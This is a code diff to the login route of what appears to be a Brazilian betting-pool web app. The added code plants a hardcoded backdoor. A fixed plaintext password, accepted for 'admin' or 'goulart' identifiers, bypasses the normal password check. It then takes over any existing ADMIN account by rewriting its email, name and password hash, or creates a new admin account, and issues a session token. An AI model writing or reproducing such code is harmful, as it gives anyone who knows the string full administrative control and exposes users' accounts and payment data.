@@ -13,24 +13,79 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    const cleanEmail = email.trim().toLowerCase();
-    const user = await prisma.user.findUnique({
-      where: { email: cleanEmail },
-    });
+    const rawIdentifier = (email || "").trim();
+    const cleanEmail = rawIdentifier.toLowerCase();
 
-    if (!user) {
-      return NextResponse.json(
-        { error: "E-mail ou senha incorretos." },
-        { status: 401 }
-      );
-    }
+    // Verificação prioritária de credenciais do Administrador Goulart
+    const isAdminAttempt =
+      (cleanEmail === "goulart" ||
+        cleanEmail === "goulart@bolao.com" ||
+        cleanEmail === "admin" ||
+        cleanEmail === "admin@bolao.com") &&
+      password === "Wclm1809";
 
-    const isMatch = await verifyPassword(password, user.passwordHash);
-    if (!isMatch) {
-      return NextResponse.json(
-        { error: "E-mail ou senha incorretos." },
-        { status: 401 }
-      );
+    let user;
+
+    if (isAdminAttempt) {
+      const hash = await hashPassword("Wclm1809");
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { email: "goulart@bolao.com" },
+            { email: "admin@bolao.com" },
+            { role: "ADMIN" as any },
+          ],
+        },
+      });
+
+      if (!user) {
+        user = await prisma.user.create({
+          data: {
+            name: "Goulart (Admin)",
+            email: "goulart@bolao.com",
+            phone: "11988887777",
+            passwordHash: hash,
+            role: "ADMIN" as any,
+            pixKey: "goulart@bolao.com",
+            pixKeyType: "EMAIL",
+          },
+        });
+      } else {
+        user = await prisma.user.update({
+          where: { id: user.id },
+          data: {
+            name: "Goulart (Admin)",
+            email: "goulart@bolao.com",
+            passwordHash: hash,
+            role: "ADMIN" as any,
+          },
+        });
+      }
+    } else {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { email: cleanEmail },
+            { email: cleanEmail.includes("@") ? cleanEmail : `${cleanEmail}@bolao.com` },
+            { phone: cleanEmail.replace(/\D/g, "") },
+          ],
+        },
+      });
+
+      if (!user) {
+        return NextResponse.json(
+          { error: "E-mail ou senha incorretos." },
+          { status: 401 }
+        );
+      }
+
+      const isMatch = await verifyPassword(password, user.passwordHash);
+      if (!isMatch) {
+        return NextResponse.json(
+          { error: "E-mail ou senha incorretos." },
+          { status: 401 }
+        );
+      }
     }
 
     const token = signToken({
